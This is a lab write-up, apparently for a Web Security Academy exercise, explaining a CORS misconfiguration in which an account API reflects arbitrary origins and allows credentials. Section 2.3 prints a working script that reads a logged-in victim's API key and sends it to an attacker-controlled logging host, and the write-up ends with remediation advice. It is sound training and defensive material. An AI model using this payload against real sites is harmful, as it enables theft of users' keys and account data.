# Lab: Sensitive Data Leakage via CORS Misconfiguration 

**Severity:** High 

**Vulnerability Type:** Cross-Origin Resource Sharing (CORS) Misconfiguration

**Target:** Web Security Academy Shop - User Account API

##### 1. Executive Summary 

A security assessment of the "We Like to Shop" application revealed a critical
misconfiguration in its Cross-Origin Resource Sharing (CORS) policy. 

The application's API endpoint (`/accountDetails`) blindly trusts requests from
arbitrary origins. It dynamically reflects the value of the `Origin` header 
sent by the client into the `Access-Control-Allow-Origin` response header and sets 
`Access-Control-Allow-Credentials` to `true`. This configuration allows an 
attacker to host a malicious website that, when visited by a logged-in 
victim, makes authenticated cross-domain requests to the vulnerable endpoint. 
This permits the attacker to read the victim's sensitive data (in this case, 
their API key)

##### 2. Technical Walkthrough 

2.1 Target Identification 

The assessment focused on the `/accountDetails` API endpoint, which returns 
sensitive user information, including the user's unique API key, in JSON 
format. 

<img width="1440" height="876" alt="aa2" src="https://github.com/user-attachments/assets/c82095cc-0725-4eaf-ba32-0639acd3efed" />

2.2 Vulnerability Verification 

To test for CORS misconfigurations, the request was intercepted in Burp 
Suite, and an arbitrary origin (`Origin: www.example.com`) was added to the 
request headers. 

The server responded with:

1. `Access-Control-Allow-Origin: www.example.com` (Reflected the arbitrary
input)

2. `Access-Control-Allow-Credentials: true` (Allowed cookies to be sent)

This combination allows any external site to read the response from this 
endpoint on behalf of the victim. 

<img width="1440" height="875" alt="aa3" src="https://github.com/user-attachments/assets/2576d61a-3987-4dab-9b88-849f18d9c4f1" />

2.3 Exploitation 

An exploit script was crafted and hosted on the attacker's server (Exploit 
Server). The script uses JavaScript's `fetch` API to:

1. Send a GET request to the vulnerable URL.

2. Include the `credentials: 'include'` flag to ensure the victim's session
cookies are sent with the request.

3. Parse the JSON response to extract the `apikey`.

4. Exfiltrate the stolen key to the attacker's logger.

Malicious Payload:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    // 1. Target the vulnerable API endpoint
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    // 2. Crucial: Send cookies with the request
    req.withCredentials = true;
    req.send();

    function reqListener() {
        // 3. Extract key and exfiltrate
        var json = JSON.parse(this.responseText);
        location='https://exploit-server.net/log?key='+json.apikey;
    };
</script>
```

<img width="1440" height="763" alt="aa4" src="https://github.com/user-attachments/assets/1d7f7c72-deea-4c1e-958d-00e85b0d51ec" />

2.4 Execution and Data Theft

When the victim viewed the exploit page, their browser executed the script.
It successfully retrieved the data from the vulnerable application and sent
the API key to the attacker's access log. 

<img width="1186" height="731" alt="aa5" src="https://github.com/user-attachments/assets/adda9af8-b7cd-4512-aa76-539376abab29" />
<img width="1187" height="745" alt="aa6" src="https://github.com/user-attachments/assets/d3ffc7cf-8edd-4c83-b8f6-2f5024ffc3d3" />

##### 3. Impact Analysis 

The impact is rated as High.

- Data Breach: Sensitive user data (API keys, PII, financial info) can
be read by unauthorised third parties.

- Account Compromise: If the API returns session tokens or passwords reset
links, full account takeover is possible.

##### 4. Remediation

To mitigate this vulnerability: 

1. Whitelist Origins: Do not blindly reflect the `Origin` header. Validate
it against a strict server-side whitelist of trusted domains (e.g.,
specific subdomains or partner sites).

2. Avoid Wildcards with Credentials: Never set `Access-Control-Allow-Origin: *`
if `Access-Control-Allow-Credentials` is set to `true` (though in this
specific case, the reflection mimics a wildcard behavior).

3. Vary Header: Ensure the `Vary: Origin` header is set to instruct caches
to store different responses based on the origin, preventing cache
poisoning attacks. 
